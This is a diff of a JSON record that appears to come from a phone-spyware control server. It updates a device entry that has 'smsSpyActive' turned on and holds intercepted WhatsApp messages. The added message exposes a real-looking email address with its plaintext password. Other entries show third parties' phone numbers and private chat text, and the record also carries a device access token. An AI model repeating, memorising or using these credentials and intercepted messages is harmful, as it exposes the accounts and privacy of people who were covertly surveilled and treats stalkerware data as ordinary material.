@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776908169937,
+    "lastSeen": 1776908172968,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 822-6965-3769",
+        "content": "replacement 2u1m (23-04)\nemail: angela.baisler@gmail.com\npass: Beanie915078\nprofile: 4\npin: -",
+        "time": "23/04 09:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908175846
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "22/04 19:29",
         "pkg": "com.whatsapp",
         "receivedAt": 1776857353556
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "+62 823-1199-7104",
-        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
-        "time": "22/04 19:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776857353383
       }
     ],
     "galleryPhotos": [],
